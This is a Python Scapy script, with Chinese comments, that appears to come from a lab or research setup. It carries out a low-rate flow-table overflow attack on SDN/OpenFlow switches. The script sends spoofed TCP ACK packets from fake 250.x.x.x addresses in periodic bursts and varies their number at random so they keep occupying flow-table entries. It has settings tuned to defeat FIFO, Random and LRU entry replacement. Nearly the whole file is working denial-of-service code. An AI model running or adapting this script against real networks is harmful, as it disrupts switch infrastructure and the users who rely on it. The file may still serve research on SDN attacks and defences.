# 周期性构造数据包（8s）
# 发动攻击时概率性增加或减少数据包
# 以8s为周期，分1次sendp数据包，最大攻击数1000，单次攻击100

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import random
import sched


# 随机创建IP地址
def Random_Section():
    section = random.randint(1, 254)
    return section
def Random_IP():
    IP = '250.' + str(Random_Section()) + '.' + str(Random_Section()) + '.' + str(Random_Section())
    return IP


class MyAttack(object):
    def __init__(self, controller, attack_T=8, group=1, packets_number=100):
        super(MyAttack, self).__init__()
        # 主机IP列表
        self.hosts = ['10.0.0.2', '10.0.0.3', '10.0.0.4', '10.0.0.5', '10.0.0.6', '10.0.0.7', '10.0.0.8']
        # self.hosts = hosts
        self.ports = [port for port in range(1025, 1200)]
        self.sips = ['250.0.0.1', '250.0.0.2', '250.0.0.3', '250.0.0.4', '250.0.0.5', '250.0.0.6', '250.0.0.7', '250.0.0.8']
        self.sports = [port for port in range(1525, 1550)]
        # (可使用的总攻击数据包)构造大于所需数量的攻击数据包用以选择    [dip, dport, sip, sport]
        self.all_packets = [(dip, dport, sip, sport) for dip in self.hosts for dport in self.ports for sip in [sip for sip in self.sips if not sip.split('.')[3] == dip.split('.')[3]] for sport in self.sports]
        random.shuffle(self.all_packets)  # 打乱
    
        self.controller = controller    # 控制器流表项替换机制
        self.attack_T = attack_T  # 攻击周期，默认值为流表项超时时间
        self.group = group
        self.packets_number = packets_number  # 单轮新增数据包数
        self.max_packets = packets_number*15  # 最大攻击总数（交换机流表空间大小的70%）
        self.count = 0  # 当前使用的总攻击数据包数
        self.send_packets = []  # 需维持发送的数据包
        self.is_stop = False
        # self.scheduler = sched.scheduler(time.time, time.sleep)  # 任务调度

    # 新增number个攻击数据包，保存至self.send_packets
    def createPacket(self, number):
        if len(self.all_packets) < number:  # 可使用的攻击流不够
            print('no enough flows to use!')
            return
        new_conns = self.all_packets[:number]  # 选取攻击流
        del self.all_packets[:number]
        for conn in new_conns:
            dip, dport, sip, sport = conn
            size = random.randrange(1, 10)     # 数据包长度
            content = b'\xde\xad\xfa\xce' * size  # 数据包内容

            # size = random.randrange(1, 40)     # 数据包长度
            # content = b'\xfa' * size  # 数据包内容

            # pkt = IP(src=sip, dst=dip) / TCP(sport=sport, dport=dport, flags="A") / content
            pkt = Ether() / IP(src=sip, dst=dip) / TCP(sport=sport, dport=dport, flags="A") / content
            self.send_packets.append(pkt)
        self.count += number
        # print("count+:", self.count)

    # 删除前self.packets_number个数据包
    def delPacket(self, number):
        if self.count > number:
            self.all_packets += self.send_packets[:number]
            del self.send_packets[:number]
            self.count -= number
        # print("count-:", self.count)

    # Ti周期第i组，发送数据包packets
    def sendPacket(self, packets, Ti, i=0):
        print(Ti, "-", i, "Attack Start：", time.asctime(time.localtime()), time.time())
        # send(packets, verbose=False)
        sendp(packets, iface='h1-eth0', verbose=False)
        print(Ti, "-", i, "Attack End：", time.asctime(time.localtime()), time.time())


    # 随机波动数据包，每8s执行一次
    def randomCreate(self, i):
        seed = random.randint(1, 10)
        print("seed:", seed)
        if seed < 2:    # 20%
            self.delPacket(self.packets_number * 2)
        elif seed < 8:  # 60%
            self.createPacket(self.packets_number)

    # 周期性发送数据包占用流表项（多次发送少数，长流占领）
    def run(self):
        self.randomCreate(0)    # 构造第一轮攻击数据包
        t_create = time.time()
        # self.createPacket(self.max_packets)
        Ti = 0  # 攻击周期
        p = 1   # 构造数据包周期
        while not self.is_stop:
            if time.time() > t_create+8 :
                # 周期性构造数据包（8s）
                if self.count < self.max_packets:
                    self.randomCreate(p)
                    t_create = time.time()
                    p += 1
                # 周期性波动数据包（8s）
                else:
                    seed = random.randint(1, 10)
                    if seed < 3:
                        print("seed:", seed)
                        self.delPacket(self.packets_number*5)
                        self.createPacket(self.packets_number*5)
                    
                    # self.delPacket(self.packets_number)
                    # self.createPacket(self.packets_number)
                    
                    t_create = time.time()

            print("已构造的攻击数据包:", self.count)
            # 发送攻击数据包
            if self.controller == 'FIFO':
                t_send = time.time()
                packet_number = self.count // self.group
                packet_time = self.attack_T / self.group
                # print("packet_time:", packet_time)
                # 将当前使用的总攻击数据包分n组发送
                for i in range(self.group):  # 分n次发送数据包(添加本周期数据包发送任务)
                    t_send_i = time.time()
                    # print(packet_number, i * packet_number, (i + 1) * packet_number)
                    self.sendPacket(self.send_packets[i * packet_number:(i + 1) * packet_number], Ti, i)
                    # print(t_send_i)
                    # print(time.time())
                    # print(time.time()-t_send_i)
                    delay = packet_time-time.time()+t_send_i
                    # print(delay)
                    if delay > 0:
                        time.sleep(delay)
                # print('t_send:', t_send)
                # print('time:', time.time())
                print('time-t_send:', time.time()-t_send)
            else:
                t_send = time.time()
                self.sendPacket(self.send_packets, Ti)
                # print(t)
                # print(time.time())
                # print(time.time()-t)
                delay = self.attack_T-time.time()+t_send
                if delay > 0:
                    time.sleep(delay)
                # print('t_send:', t_send)
                # print('time:', time.time())
                print('time-t_send:', time.time()-t_send)
            Ti += 1  # 下一周期编号

    def stop(self):
        self.is_stop = True

def main(controller):
    # attack = MyAttack(attack_T=8, group=1, packets_number=100)
    if controller == 'FIFO':
        attack = MyAttack(controller, group=20)   # FIFO: 08 20 100
    elif controller == 'Random':
        attack = MyAttack(controller, packets_number=150) # Random: 08 01 150
    elif controller == 'LRU':
        attack = MyAttack(controller, attack_T=1)    # LRU: 01 01 100

    try:
        attack.run()  # 分组发送数据包
    except KeyboardInterrupt:
        attack.stop()
        print('ctrl + c to exit...')


if __name__ == "__main__":
    print('attack start after 150s...')
    time.sleep(150)
    # print(sys.argv)
    main(sys.argv[2])

    # python Desktop/attack/MyAttack.py -c FIFO
    # python Desktop/attack/MyAttack.py -c Random
    # python Desktop/attack/MyAttack.py -c LRU